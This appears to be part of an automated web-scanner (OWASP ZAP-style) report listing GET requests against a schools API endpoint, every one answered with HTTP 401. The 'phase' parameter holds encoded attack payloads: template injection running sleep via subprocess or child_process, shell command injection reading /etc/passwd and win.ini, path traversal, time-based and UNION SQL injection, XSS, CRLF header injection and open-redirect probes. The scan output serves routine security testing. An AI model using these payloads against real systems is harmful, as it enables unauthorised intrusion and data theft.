* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253C%2521--
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253Cscript%253Ealert(1&29%253C/script%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%255Cschools
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%255CWEB-INF%255Cweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%255D%255D%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%257Bsystem%2528%2522sleep+15%2522%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=0W45pz4p
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=5%253BURL%253D%2527https%253A%252F%252F980414377652208366.owasp.org%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=980414377652208366.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=any%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=any%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=any%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6%250D%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=any%253F%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=any%253F%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=any%253F%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6%250D%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=c%253A%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=c%253A%252FWindows%252Fsystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=c%253A%255C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=c%253A%255CWindows%255Csystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=cat+%252Fetc%252Fpasswd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=dyf6k8r6bmxcu3v727bd51p94h5y6pel3pd8gpabdi1ky28cbre4qgg1
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=get-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=http%253A%252F%252F%255C980414377652208366.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=http%253A%252F%252F980414377652208366.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=http%253A%252F%252Fwww.google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=http%253A%252F%252Fwww.google.com%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=http%253A%252F%252Fwww.google.com%253A80%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=https%253A%252F%252F%255C980414377652208366.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=https%253A%252F%252F980414377652208366%25252eowasp%25252eorg
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=https%253A%252F%252F980414377652208366.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=javascript:alert(1&29
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%2526cat+%252Fetc%252Fpasswd%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%2526sleep+15.0%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%2526timeout+%252FT+15.0%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%253Bget-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%253Bsleep+15.0%253B%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%253Bstart-sleep+-s+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%257Ctimeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522+%252F+sleep%252815%2529+%252F+%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2526cat+%252Fetc%252Fpasswd%2526
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2526sleep+15.0%2526
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2526timeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2526type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%2526cat+%252Fetc%252Fpasswd%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%2526sleep+15.0%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%2526timeout+%252FT+15.0%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%2528
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%2529+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%253Bget-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%253Bsleep+15.0%253B%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%253Bstart-sleep+-s+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%257Ctimeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+%252F+sleep%252815%2529+%252F+%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
